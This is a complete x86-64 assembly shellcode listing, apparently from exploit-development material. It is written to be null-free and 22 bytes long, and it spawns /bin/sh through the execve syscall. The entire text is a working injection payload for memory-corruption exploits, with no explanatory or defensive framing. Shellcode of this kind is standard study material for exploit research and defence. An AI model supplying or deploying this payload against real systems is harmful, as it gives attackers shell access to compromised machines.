; execve("/bin//sh", NULL, NULL), null-free, 22 bytes
BITS 64
xor esi, esi
push rsi
mov rax, 0x68732f2f6e69622f ; "/bin//sh"
push rax
push rsp
pop rdi                 ; path -> "/bin//sh"

; set edx:eax = 0
imul esi

mov al, 59              ; __NR_execve
syscall
